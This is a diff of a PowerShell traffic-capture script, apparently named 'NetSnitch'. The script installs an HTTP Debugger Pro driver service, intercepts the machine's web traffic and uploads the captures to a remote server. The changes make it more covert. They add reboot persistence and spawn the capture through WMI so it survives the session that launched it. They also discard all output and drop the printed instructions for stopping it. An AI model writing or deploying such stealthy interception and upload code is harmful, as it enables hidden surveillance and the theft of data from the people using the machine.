@@ -65,7 +65,9 @@ $storeDir    = Join-Path $programData 'HTTPDebuggerPro'
 $storePath   = Join-Path $storeDir 'settings.xml'
 $sc          = Join-Path $env:SystemRoot 'System32\sc.exe'
 
-function Sc { param([string[]]$a) (& $sc @a 2>&1) ; return $LASTEXITCODE }
+# NB: must NOT be named 'Sc' - that collides with the built-in 'sc' alias for
+# Set-Content, which would shadow this function and prompt for -Value.
+function Invoke-ScExe { param([string[]]$a) (& $sc @a 2>&1) ; return $LASTEXITCODE }
 function SvcState($name) {
   $o = (& $sc query $name 2>&1)
   if ($o -match 'RUNNING') { return 'RUNNING' }
@@ -406,9 +408,9 @@ if ($Uninstall) {
   if ($killed) { Ok "stopped $killed running capture process(es)" }
   try { Remove-Item (Join-Path $storeDir 'armed.boot') -Force -ErrorAction SilentlyContinue } catch {}
   # Stopping the service clears the driver's 80/443 filters and restores traffic.
-  Sc @('stop', $SvcName) | Out-Null
+  Invoke-ScExe @('stop', $SvcName) | Out-Null
   Start-Sleep 2
-  $r = Sc @('delete', $SvcName)
+  $r = Invoke-ScExe @('delete', $SvcName)
   if ($r -eq 0) { Ok "service removed" } else { Warn "sc delete returned $r" }
   return
 }
@@ -449,48 +451,45 @@ function New-PersistenceTask {
   }
 }
 
-if ($Persistence) {
+# -Persistence WITHOUT -Background: just install the boot task and exit (verbose).
+# It must NOT fall through into the foreground capture loop - doing so would arm
+# the service and capture in whatever session launched it, and if that session
+# ends the armed capture is orphaned (breaks external traffic, spikes CPU).
+if ($Persistence -and -not $Background) {
   Step 'Installing reboot persistence'
   New-PersistenceTask
-  # IMPORTANT: -Persistence only INSTALLS the boot task. It must NOT fall through
-  # into the foreground capture loop. Doing so would arm the service and capture
-  # in whatever session launched it, and if that session ends the armed capture is
-  # orphaned (breaks external traffic, spikes CPU). To also start capturing now,
-  # combine with -Background (handled below). Otherwise we are done.
-  if (-not $Background) {
-    Write-Host '    capture will start automatically ~90s after each boot.' -ForegroundColor DarkGray
-    Write-Host '    to also start it now without rebooting, add -Background.' -ForegroundColor DarkGray
-    return
-  }
+  Write-Host '    capture will start automatically ~90s after each boot.' -ForegroundColor DarkGray
+  Write-Host '    to also start it now without rebooting, add -Background.' -ForegroundColor DarkGray
+  return
 }
 
+# -Background: start capturing now in a detached, hidden, SILENT process and
+# return immediately. Every stream of the child is discarded, so nothing is ever
+# printed anywhere. (With -Persistence it also installs the boot task, quietly.)
 if ($Background) {
-  Step 'Launching continuous capture in the background'
-  # Build the hidden, run-forever command line for the detached child.
-  $cl = "`"$pwsh`" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -Seconds 0"
-  if ($NoInstall)      { $cl += ' -NoInstall' }
-  if ($Server)         { $cl += " -Server `"$Server`"" }
-  if ($TrimBody -gt 0) { $cl += " -TrimBody $TrimBody" }
-  # Spawn via WMI Win32_Process.Create, NOT Start-Process: a WMI-created process
-  # is parented to WmiPrvSE and lives outside the launcher's job object/session,
-  # so it survives the parent exiting (and survives the launching console/SSH
-  # session closing; Start-Process children get killed with that job object).
+  if ($Persistence) { New-PersistenceTask *>$null }
+  # Invoke via -Command (not -File) so we can append "*> $null" and swallow ALL
+  # output. Single-quote the paths/URL so spaces are safe inside the command.
+  $inner = "& '$PSCommandPath' -Seconds 0"
+  if ($NoInstall)      { $inner += ' -NoInstall' }
+  if ($Server)         { $inner += " -Server '$Server'" }
+  if ($TrimBody -gt 0) { $inner += " -TrimBody $TrimBody" }
+  $inner += ' *> $null'
+  $cl = "`"$pwsh`" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$inner`""
+  # Spawn via WMI Win32_Process.Create: the child is parented to WmiPrvSE, so it
+  # keeps running after this process (and its console) exits. Fall back to a
+  # hidden Start-Process if WMI is unavailable.
   $launched = $false
   try {
     $r = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $cl } -ErrorAction Stop
-    if ($r.ReturnValue -eq 0) { $launched = $true; Ok "capture is running in the background (continuous, pid $($r.ProcessId))." }
-    else { Warn "Win32_Process.Create returned $($r.ReturnValue); falling back to Start-Process" }
-  } catch { Warn "WMI spawn failed ($($_.Exception.Message)); falling back to Start-Process" }
+    if ($r.ReturnValue -eq 0) { $launched = $true }
+  } catch {}
   if (-not $launched) {
-    $a = @('-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',"`"$PSCommandPath`"",'-Seconds','0')
-    if ($NoInstall)      { $a += '-NoInstall' }
-    if ($Server)         { $a += @('-Server',$Server) }
-    if ($TrimBody -gt 0) { $a += @('-TrimBody',"$TrimBody") }
-    Start-Process -FilePath $pwsh -ArgumentList $a -WindowStyle Hidden | Out-Null
-    Ok 'capture is running in the background (continuous).'
+    try {
+      Start-Process -FilePath $pwsh -WindowStyle Hidden `
+        -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-Command',$inner) *>$null
+    } catch {}
   }
-  Write-Host '    stop it with:  Get-CimInstance Win32_Process -Filter "Name=''powershell.exe''" | ? CommandLine -match NetSnitch | % { Stop-Process -Id $_.ProcessId }' -ForegroundColor DarkGray
-  if ($Persistence) { Write-Host '    it will also start automatically at every boot.' -ForegroundColor DarkGray }
   return
 }
 
@@ -551,11 +550,11 @@ if (-not $NoInstall) {
   else { Ok "/install finished" }
 
   if ((SvcState $SvcName) -eq 'ABSENT') {
-    Sc @('create', $SvcName, 'binPath=', "`"$svcExe`"", 'start=', 'auto', 'DisplayName=', 'HTTP Debugger Pro') | Out-Null
+    Invoke-ScExe @('create', $SvcName, 'binPath=', "`"$svcExe`"", 'start=', 'auto', 'DisplayName=', 'HTTP Debugger Pro') | Out-Null
   }
 
   Step 'Starting the capture service'
-  if ((SvcState $SvcName) -ne 'RUNNING') { Sc @('start', $SvcName) | Out-Null }
+  if ((SvcState $SvcName) -ne 'RUNNING') { Invoke-ScExe @('start', $SvcName) | Out-Null }
   for ($i = 0; $i -lt 60 -and (SvcState $SvcName) -ne 'RUNNING'; $i++) { Start-Sleep 1 }
   if ((SvcState $SvcName) -eq 'RUNNING') { Ok "$SvcName running" }
   else { Warn "$SvcName is $(SvcState $SvcName) - continuing anyway" }
@@ -818,7 +817,12 @@ function Send-Batch($list) {
   try {
     Invoke-RestMethod -Method Post -Uri "$script:ServerBase/api/ingest" -Body $body `
       -ContentType 'application/json' -Headers @{ $script:UploadMark = '1' } -TimeoutSec 10 | Out-Null
-  } catch { }
+    $script:UploadOk += $list.Count
+    if ($script:UploadErr) { Ok "server upload recovered (total sent: $script:UploadOk)"; $script:UploadErr = $false }
+  } catch {
+    # Surface the first failure (and recoveries) instead of silently dropping.
+    if (-not $script:UploadErr) { Warn "server upload failing: $($_.Exception.Message)"; $script:UploadErr = $true }
+  }
 }
 
 function Register-WithServer {
@@ -826,18 +830,32 @@ function Register-WithServer {
   try {
     Invoke-RestMethod -Method Post -Uri "$script:ServerBase/api/agent" `
       -Body ($body | ConvertTo-Json -Compress) -ContentType 'application/json' `
-      -Headers @{ $script:UploadMark = '1' } -TimeoutSec 5 | Out-Null
-  } catch { }
+      -Headers @{ $script:UploadMark = '1' } -TimeoutSec 8 | Out-Null
+    return $true
+  } catch { $script:RegErr = $_.Exception.Message; return $false }
 }
 
 # Set up the collector now that Get-AgentId / Register-WithServer are defined.
 if ($Server) {
+  # PowerShell 5.1 defaults to TLS 1.0, which modern servers (e.g. Cloudflare)
+  # reject - that makes every upload fail silently. Force TLS 1.2/1.3.
+  try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol `
+      -bor [Net.SecurityProtocolType]::Tls12
+    try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls13 } catch {}
+  } catch {}
   $script:ServerBase = $Server.TrimEnd('/')
   try { $script:ServerHost = ([Uri]$Server).Host } catch { $script:ServerHost = '' }
   $script:AgentId = Get-AgentId
   $script:AgentName = $env:COMPUTERNAME
-  Register-WithServer
-  Ok "streaming captures to $script:ServerBase  (agent: $script:AgentId)"
+  $script:UploadOk = 0
+  $script:UploadErr = $false
+  if (Register-WithServer) {
+    Ok "streaming captures to $script:ServerBase  (agent: $script:AgentId)"
+  } else {
+    Warn "could not reach server $script:ServerBase - $script:RegErr"
+    Warn 'will keep trying as traffic is captured; check the URL/port and that the server is running'
+  }
 }
 
 # ---------------------------------------------------------------------------
